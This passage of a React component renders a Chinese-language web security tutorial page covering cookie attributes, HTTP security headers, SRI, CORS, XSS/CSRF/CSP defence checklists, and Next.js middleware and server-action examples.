              <ShieldCheck className="w-7 h-7 text-white" strokeWidth={2.5} />
            </div>
            <div>
              <h2
                className="text-4xl md:text-5xl font-extrabold"
                style={{ fontFamily: '"Outfit", sans-serif' }}
              >
                更多防御策略
              </h2>
              <p className="text-sm font-bold uppercase tracking-wider mt-1"
                 style={{ color: "var(--quaternary)", letterSpacing: "0.05em" }}>
                ADDITIONAL SECURITY LAYERS
              </p>
            </div>
          </div>

          {/* Bento Grid */}
          <div className="grid md:grid-cols-3 gap-5">
            {/* Cookie Security */}
            <div
              className="topic-card p-5 rounded-xl"
              style={{ boxShadow: "6px 6px 0px 0px var(--accent)" }}
            >
              <div className="w-11 h-11 rounded-xl flex items-center justify-center mb-3"
                   style={{
                     background: "var(--accent)",
                     border: "2px solid var(--foreground)",
                     color: "white",
                   }}>
                <Cookie className="w-5 h-5" strokeWidth={2.5} />
              </div>
              <h4 className="text-lg font-extrabold mb-2"
                  style={{ fontFamily: '"Outfit", sans-serif' }}>
                Cookie 安全属性
              </h4>
              <div className="space-y-2 mt-3">
                {[
                  { attr: "HttpOnly", desc: "JS 无法读取，防 XSS 窃取", color: "var(--quaternary)" },
                  { attr: "Secure", desc: "仅通过 HTTPS 传输", color: "var(--accent)" },
                  { attr: "SameSite", desc: "限制跨站携带，防 CSRF", color: "var(--secondary)" },
                  { attr: "__Host-", desc: "必须 Secure + 同源", color: "var(--tertiary)" },
                ].map((item, i) => (
                  <div key={i} className="flex items-center gap-2 px-2.5 py-1.5 rounded-lg"
                       style={{ background: "var(--background)", border: "1.5px solid var(--border)" }}>
                    <span className="w-2 h-2 rounded-full flex-shrink-0" style={{ background: item.color }} />
                    <code className="text-xs font-bold" style={{ fontFamily: '"Courier New", monospace' }}>
                      {item.attr}
                    </code>
                    <span className="text-[11px] opacity-50 ml-auto">{item.desc}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* HTTP Security Headers */}
            <div
              className="topic-card p-5 rounded-xl"
              style={{ boxShadow: "6px 6px 0px 0px var(--tertiary)" }}
            >
              <div className="w-11 h-11 rounded-xl flex items-center justify-center mb-3"
                   style={{
                     background: "var(--tertiary)",
                     border: "2px solid var(--foreground)",
                     color: "white",
                   }}>
                <Server className="w-5 h-5" strokeWidth={2.5} />
              </div>
              <h4 className="text-lg font-extrabold mb-2"
                  style={{ fontFamily: '"Outfit", sans-serif' }}>
                HTTP 安全响应头
              </h4>
              <div className="space-y-2 mt-3">
                {[
                  { header: "X-Content-Type-Options", value: "nosniff", desc: "禁止 MIME 嗅探" },
                  { header: "X-Frame-Options", value: "DENY", desc: "禁止 iframe 嵌入" },
                  { header: "X-XSS-Protection", value: "0", desc: "禁用旧版 XSS 过滤" },
                  { header: "Referrer-Policy", value: "strict-origin", desc: "限制 Referer 信息" },
                  { header: "Permissions-Policy", value: "camera=()", desc: "禁用浏览器 API" },
                ].map((item, i) => (
                  <div key={i} className="px-2.5 py-1.5 rounded-lg"
                       style={{ background: "var(--background)", border: "1.5px solid var(--border)" }}>
                    <div className="flex items-center gap-1">
                      <code className="text-[11px] font-bold truncate"
                            style={{ fontFamily: '"Courier New", monospace', color: "var(--tertiary)" }}>
                        {item.header}
                      </code>
                    </div>
                    <p className="text-[10px] opacity-50 mt-0.5">
                      {item.value} — {item.desc}
                    </p>
                  </div>
                ))}
              </div>
            </div>

            {/* Subresource Integrity + CORS */}
            <div
              className="topic-card p-5 rounded-xl"
              style={{ boxShadow: "6px 6px 0px 0px var(--secondary)" }}
            >
              <div className="w-11 h-11 rounded-xl flex items-center justify-center mb-3"
                   style={{
                     background: "var(--secondary)",
                     border: "2px solid var(--foreground)",
                     color: "white",
                   }}>
                <Lock className="w-5 h-5" strokeWidth={2.5} />
              </div>
              <h4 className="text-lg font-extrabold mb-2"
                  style={{ fontFamily: '"Outfit", sans-serif' }}>
                SRI & CORS
              </h4>
              <div className="space-y-3 mt-3">
                <div className="p-3 rounded-xl"
                     style={{ background: "var(--background)", border: "1.5px solid var(--border)" }}>
                  <p className="text-xs font-bold mb-1" style={{ fontFamily: '"Outfit", sans-serif' }}>
                    🔐 子资源完整性 (SRI)
                  </p>
                  <p className="text-[11px] opacity-60 leading-relaxed"
                     style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}>
                    通过哈希校验外部资源是否被篡改
                  </p>
                  <code className="block mt-2 text-[10px] px-2 py-1 rounded"
                        style={{
                          background: "#1E293B",
                          color: "#E2E8F0",
                          fontFamily: '"Courier New", monospace',
                        }}>
                    {`<script src="..." integrity="sha384-..." crossorigin>`}
                  </code>
                </div>
                <div className="p-3 rounded-xl"
                     style={{ background: "var(--background)", border: "1.5px solid var(--border)" }}>
                  <p className="text-xs font-bold mb-1" style={{ fontFamily: '"Outfit", sans-serif' }}>
                    🌐 CORS 跨域策略
                  </p>
                  <p className="text-[11px] opacity-60 leading-relaxed"
                     style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}>
                    严格限制 Access-Control-Allow-Origin，避免使用 <code className="font-bold">*</code> 通配符
                  </p>
                  <code className="block mt-2 text-[10px] px-2 py-1 rounded"
                        style={{
                          background: "#1E293B",
                          color: "#E2E8F0",
                          fontFamily: '"Courier New", monospace',
                        }}>
                    Access-Control-Allow-Origin: https://myapp.com
                  </code>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ========== SUMMARY COMPARISON TABLE ========== */}
      <section className="container mt-16">
        <div className="animate-slide" style={{ animationDelay: "0.35s" }}>
          <div
            className="p-6 md:p-8 rounded-2xl"
            style={{
              background: "var(--card)",
              border: "3px solid var(--foreground)",
              boxShadow: "8px 8px 0px 0px var(--accent)",
            }}
          >
            <div className="flex items-center gap-3 mb-6">
              <div
                className="w-10 h-10 rounded-xl flex items-center justify-center"
                style={{
                  background: "var(--accent)",
                  border: "2px solid var(--foreground)",
                }}
              >
                <Shield className="w-5 h-5 text-white" strokeWidth={2.5} />
              </div>
              <h3
                className="text-2xl font-extrabold"
                style={{ fontFamily: '"Outfit", sans-serif' }}
              >
                📊 防御策略速查对比
              </h3>
            </div>

            {/* Comparison Cards */}
            <div className="grid md:grid-cols-3 gap-4">
              {/* XSS Defenses */}
              <div className="p-4 rounded-xl"
                   style={{
                     border: "2px solid var(--secondary)",
                     boxShadow: "4px 4px 0px 0px var(--secondary)",
                     background: "white",
                   }}>
                <div className="flex items-center gap-2 mb-3 pb-3"
                     style={{ borderBottom: "2px dashed var(--border)" }}>
                  <Bug className="w-4 h-4" style={{ color: "var(--secondary)" }} strokeWidth={2.5} />
                  <span className="text-sm font-extrabold" style={{ fontFamily: '"Outfit", sans-serif' }}>
                    XSS 防御清单
                  </span>
                </div>
                {[
                  { text: "HTML 输出转义", level: "必须" },
                  { text: "DOMPurify 消毒", level: "必须" },
                  { text: "避免 innerHTML", level: "必须" },
                  { text: "HttpOnly Cookie", level: "强烈推荐" },
                  { text: "CSP script-src", level: "强烈推荐" },
                  { text: "输入长度限制", level: "推荐" },
                ].map((item, i) => (
                  <div key={i} className="flex items-center gap-2 py-1.5">
                    <CheckCircle className="w-3.5 h-3.5 flex-shrink-0" style={{ color: "var(--quaternary)" }} strokeWidth={2.5} />
                    <span className="text-xs flex-1" style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}>
                      {item.text}
                    </span>
                    <span className="text-[10px] font-bold px-1.5 py-0.5 rounded-full"
                          style={{
                            background: item.level === "必须" ? "var(--secondary)" : "var(--background)",
                            color: item.level === "必须" ? "white" : "var(--foreground)",
                            border: item.level === "必须" ? "none" : "1px solid var(--border)",
                          }}>
                      {item.level}
                    </span>
                  </div>
                ))}
              </div>

              {/* CSRF Defenses */}
              <div className="p-4 rounded-xl"
                   style={{
                     border: "2px solid var(--accent)",
                     boxShadow: "4px 4px 0px 0px var(--accent)",
                     background: "white",
                   }}>
                <div className="flex items-center gap-2 mb-3 pb-3"
                     style={{ borderBottom: "2px dashed var(--border)" }}>
                  <Globe className="w-4 h-4" style={{ color: "var(--accent)" }} strokeWidth={2.5} />
                  <span className="text-sm font-extrabold" style={{ fontFamily: '"Outfit", sans-serif' }}>
                    CSRF 防御清单
                  </span>
                </div>
                {[
                  { text: "CSRF Token 验证", level: "必须" },
                  { text: "SameSite Cookie", level: "必须" },
                  { text: "验证 Origin/Referer", level: "推荐" },
                  { text: "敏感操作二次确认", level: "强烈推荐" },
                  { text: "关键请求加验证码", level: "推荐" },
                  { text: "避免 GET 改状态", level: "必须" },
                ].map((item, i) => (
                  <div key={i} className="flex items-center gap-2 py-1.5">
                    <CheckCircle className="w-3.5 h-3.5 flex-shrink-0" style={{ color: "var(--quaternary)" }} strokeWidth={2.5} />
                    <span className="text-xs flex-1" style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}>
                      {item.text}
                    </span>
                    <span className="text-[10px] font-bold px-1.5 py-0.5 rounded-full"
                          style={{
                            background: item.level === "必须" ? "var(--accent)" : "var(--background)",
                            color: item.level === "必须" ? "white" : "var(--foreground)",
                            border: item.level === "必须" ? "none" : "1px solid var(--border)",
                          }}>
                      {item.level}
                    </span>
                  </div>
                ))}
              </div>

              {/* CSP Defenses */}
              <div className="p-4 rounded-xl"
                   style={{
                     border: "2px solid var(--tertiary)",
                     boxShadow: "4px 4px 0px 0px var(--tertiary)",
                     background: "white",
                   }}>
                <div className="flex items-center gap-2 mb-3 pb-3"
                     style={{ borderBottom: "2px dashed var(--border)" }}>
                  <Layers className="w-4 h-4" style={{ color: "var(--tertiary)" }} strokeWidth={2.5} />
                  <span className="text-sm font-extrabold" style={{ fontFamily: '"Outfit", sans-serif' }}>
                    CSP 配置清单
                  </span>
                </div>
                {[
                  { text: "default-src 'self'", level: "必须" },
                  { text: "script-src + nonce", level: "强烈推荐" },
                  { text: "禁止 unsafe-inline", level: "强烈推荐" },
                  { text: "禁止 unsafe-eval", level: "强烈推荐" },
                  { text: "frame-ancestors 'none'", level: "推荐" },
                  { text: "report-uri 上报违规", level: "推荐" },
                ].map((item, i) => (
                  <div key={i} className="flex items-center gap-2 py-1.5">
                    <CheckCircle className="w-3.5 h-3.5 flex-shrink-0" style={{ color: "var(--quaternary)" }} strokeWidth={2.5} />
                    <span className="text-xs flex-1" style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}>
                      {item.text}
                    </span>
                    <span className="text-[10px] font-bold px-1.5 py-0.5 rounded-full"
                          style={{
                            background: item.level === "必须" ? "var(--tertiary)" : "var(--background)",
                            color: item.level === "必须" ? "white" : "var(--foreground)",
                            border: item.level === "必须" ? "none" : "1px solid var(--border)",
                          }}>
                      {item.level}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ========== NEXT.JS SPECIFIC TIPS ========== */}
      <section className="container mt-16">
        <div className="animate-slide" style={{ animationDelay: "0.4s" }}>
          <div
            className="p-6 rounded-2xl"
            style={{
              background: "var(--foreground)",
              border: "3px solid var(--foreground)",
              boxShadow: "8px 8px 0px 0px var(--quaternary)",
            }}
          >
            <div className="flex items-center gap-3 mb-5">
              <div
                className="w-10 h-10 rounded-xl flex items-center justify-center"
                style={{
                  background: "var(--quaternary)",
                  border: "2px solid var(--foreground)",
                }}
              >
                <FileCode className="w-5 h-5 text-white" strokeWidth={2.5} />
              </div>
              <h3
                className="text-xl font-extrabold text-white"
                style={{ fontFamily: '"Outfit", sans-serif' }}
              >
                ⚛️ Next.js 项目安全实践
              </h3>
            </div>

            <div className="grid md:grid-cols-2 gap-4">
              <div
                className="rounded-xl overflow-hidden"
                style={{ border: "2px solid #475569" }}
              >
                <div className="px-4 py-2 flex items-center gap-2"
                     style={{ background: "#334155", color: "white" }}>
                  <Terminal className="w-4 h-4" strokeWidth={2.5} />
                  <span className="text-xs font-bold" style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}>
                    middleware.ts — 安全响应头
                  </span>
                </div>
                <pre
                  className="p-4 text-sm leading-relaxed overflow-x-auto"
                  style={{
                    background: "#0F172A",
                    color: "#E2E8F0",
                    fontFamily: '"Courier New", monospace',
                  }}
                >
{`// middleware.ts
import { NextResponse } from 'next/server';

export function middleware(request) {
  const nonce = crypto.randomUUID();
  const response = NextResponse.next();

  response.headers.set(
    'Content-Security-Policy',
    \`default-src 'self';
     script-src 'self' 'nonce-\${nonce}';
     style-src 'self' 'unsafe-inline';
     img-src 'self' https://cdn.example.com;
     connect-src 'self' https://api.myapp.com;
     frame-ancestors 'none';\`
  );

  response.headers.set(
    'X-Content-Type-Options', 'nosniff'
  );
  response.headers.set(
    'X-Frame-Options', 'DENY'
  );
  response.headers.set(
    'Referrer-Policy', 'strict-origin'
  );

  return response;
}`}
                </pre>
              </div>

              <div
                className="rounded-xl overflow-hidden"
                style={{ border: "2px solid #475569" }}
              >
                <div className="px-4 py-2 flex items-center gap-2"
                     style={{ background: "#334155", color: "white" }}>
                  <Terminal className="w-4 h-4" strokeWidth={2.5} />
                  <span className="text-xs font-bold" style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}>
                    Server Action — CSRF 防护
                  </span>
                </div>
                <pre
                  className="p-4 text-sm leading-relaxed overflow-x-auto"
                  style={{
                    background: "#0F172A",
                    color: "#E2E8F0",
                    fontFamily: '"Courier New", monospace',
                  }}
                >
{`// app/actions/transfer.ts
'use server';

import { auth } from '@/lib/auth';
import { z } from 'zod';

const schema = z.object({
  to: z.string().min(1).max(50),
  amount: z.number().positive().max(10000),
});

export async function transfer(formData) {
  // 1. 验证身份
  const user = await auth();
  if (!user) throw new Error('Unauthorized');

  // 2. 输入验证 (防注入)
  const data = schema.parse({
    to: formData.get('to'),
    amount: Number(formData.get('amount')),
  });

  // 3. 业务逻辑
  // Next.js Server Actions 内置
  // CSRF 保护（同源验证）
  await db.transfer({
    from: user.id,
    to: data.to,
    amount: data.amount,
  });
}`}
                </pre>
              </div>
            </div>

            {/* Quick Tips */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mt-5">
              {[
                { tip: "React 自动转义 JSX", icon: <Code className="w-4 h-4" /> },
                { tip: "Server Actions 同源校验", icon: <Lock className="w-4 h-4" /> },
                { tip: "next.config.js 安全头", icon: <FileCode className="w-4 h-4" /> },
                { tip: "env 变量永不暴露客户端", icon: <Ban className="w-4 h-4" /> },
              ].map((item, i) => (
                <div
                  key={i}
                  className="flex items-center gap-2 px-3 py-2.5 rounded-xl text-white"
                  style={{
                    background: "rgba(255,255,255,0.08)",
                    border: "1.5px solid #475569",
                  }}
                >
                  <div className="w-7 h-7 rounded-lg flex items-center justify-center flex-shrink-0"
                       style={{ background: "var(--quaternary)", color: "white" }}>
                    {item.icon}
                  </div>
                  <span className="text-xs font-bold" style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}>
                    {item.tip}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* ========== FOOTER KEY TAKEAWAY ========== */}
      <section className="container mt-16">
        <div className="animate-slide" style={{ animationDelay: "0.45s" }}>
          <div
            className="relative p-8 rounded-2xl text-center overflow-hidden"
            style={{
              background: "var(--card)",
              border: "3px solid var(--foreground)",
              boxShadow: "8px 8px 0px 0px var(--accent)",
            }}
          >
            {/* Decorative blobs */}
            <div
              className="absolute -bottom-10 -left-10 w-40 h-40 opacity-10"
              style={{
                background: "var(--secondary)",
                borderRadius: "60% 40% 30% 70% / 60% 30% 70% 40%",
              }}
            />
            <div
              className="absolute -top-10 -right-10 w-48 h-48 opacity-10"
              style={{
                background: "var(--tertiary)",
                borderRadius: "40% 60% 70% 30% / 30% 70% 40% 60%",
              }}
            />

            <div className="relative z-10">
              <div
                className="w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-4"
                style={{
                  background: "var(--accent)",
                  border: "3px solid var(--foreground)",
                  boxShadow: "4px 4px 0px 0px var(--foreground)",
                }}
              >
                <ShieldCheck className="w-8 h-8 text-white" strokeWidth={2.5} />
              </div>
              <h3
                className="text-3xl md:text-4xl font-extrabold mb-4"
                style={{ fontFamily: '"Outfit", sans-serif' }}
              >
                安全的核心原则
              </h3>
              <div className="max-w-xl mx-auto space-y-3">
                {[
                  { text: "永远不要信任客户端输入", color: "var(--secondary)" },
                  { text: "纵深防御：多层安全机制叠加", color: "var(--accent)" },
                  { text: "最小权限原则：只开放必要的能力", color: "var(--tertiary)" },
                  { text: "安全是持续的过程，不是一次性的配置", color: "var(--quaternary)" },
                ].map((item, i) => (
                  <div
                    key={i}
                    className="flex items-center gap-3 px-4 py-3 rounded-xl text-left"
                    style={{
                      background: "var(--background)",
                      border: "2px solid var(--border)",
                    }}
                  >
                    <span
                      className="w-8 h-8 rounded-full flex items-center justify-center text-white text-xs font-bold flex-shrink-0"
                      style={{
                        background: item.color,
                        border: "2px solid var(--foreground)",
                      }}
                    >
                      {i + 1}
                    </span>
                    <span
                      className="text-sm font-bold"
                      style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}
                    >
                      {item.text}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      </section>
    </div>
  );
}